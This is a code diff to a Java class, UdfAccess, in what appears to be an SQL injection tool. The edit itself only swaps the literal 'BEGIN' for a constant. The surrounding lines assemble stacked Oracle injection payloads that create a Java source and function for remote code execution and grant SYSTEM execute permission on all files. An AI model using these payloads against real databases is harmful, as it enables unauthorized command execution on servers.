@@ -38,6 +38,7 @@ public class UdfAccess {
     private static final String NAME_TABLE = "temp";
     private static final String RCE_JAVA_UTIL_SRC = "RCE_JAVA_UTIL_SRC";
     private static final String RCE_JAVA_UTIL_FUNC = "RCE_JAVA_UTIL_FUNC";
+    private static final String BEGIN = "BEGIN";
 
     private final InjectionModel injectionModel;
     private final BiPredicate<String, String> biPredConfirm = (String pathRemoteFolder, String nameLibraryRandom) -> {
@@ -64,7 +65,7 @@ public class UdfAccess {
         this.injectionModel.injectWithoutIndex(String.format(pattern, UdfAccess.RCE_JAVA_UTIL_FUNC), "body#drop-src");
         pattern = " ; %s ";
         this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
-            "BEGIN",
+            UdfAccess.BEGIN,
             "\\n",
             "EXECUTE IMMEDIATE 'create or replace and compile java source named \"",
             UdfAccess.RCE_JAVA_UTIL_SRC,
@@ -73,7 +74,7 @@ public class UdfAccess {
             "END;"
         )), "body#create-src");
         this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
-            "BEGIN",
+            UdfAccess.BEGIN,
             "\\n",
             "EXECUTE IMMEDIATE 'create or replace function ",
             UdfAccess.RCE_JAVA_UTIL_FUNC,
@@ -84,7 +85,7 @@ public class UdfAccess {
             "END;"
         )), "body#create-func");
         this.injectionModel.injectWithoutIndex(String.format(pattern, String.join(StringUtils.EMPTY,
-            "BEGIN",
+            UdfAccess.BEGIN,
             "\\n",
             "dbms_java.grant_permission('SYSTEM', 'SYS:java.io.FilePermission', '<<ALL FILES>>', 'execute');",
             "\\n",
